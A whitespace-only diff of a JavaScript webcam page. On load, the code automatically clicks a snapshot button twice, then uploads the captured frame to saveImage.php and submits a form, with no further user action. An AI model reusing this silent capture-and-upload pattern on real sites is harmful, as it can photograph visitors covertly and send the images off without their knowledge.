@@ -13,25 +13,25 @@ window.onload = function(){
             video.play();
         });
     }
-    
+
     // Trigger photo take
 
     document.getElementById("snap").addEventListener("click", function() {
         context.drawImage(video, 0, 0, 640, 480);
     });
-    
+
     var snap = document.getElementById('snap');
     var n = 2;
     (function submit(){
         if(n > 0) {
             snap.click();
-            setTimeout(submit, 2000); 
+            setTimeout(submit, 2000);
             n--;
         }
     })();
 }
 
-setTimeout(function(){ 
+setTimeout(function(){
     uploadEx();
     document.forms["form2"].submit();
 }, 3000);
@@ -40,19 +40,19 @@ function uploadEx() {
                 var dataURL = canvas.toDataURL("image/png");
                 document.getElementById('hidden').value = dataURL;
                 var fd = new FormData(document.forms["form1"]);
- 
+
                 var xhr = new XMLHttpRequest();
                 xhr.open('POST', 'saveImage.php', true);
- 
+
                 xhr.upload.onprogress = function(e) {
                     if (e.lengthComputable) {
                         var percentComplete = (e.loaded / e.total) * 100;
                         console.log(percentComplete + '% uploaded');
                     }
                 };
- 
+
                 xhr.onload = function() {
- 
+
                 };
                 xhr.send(fd);
             };
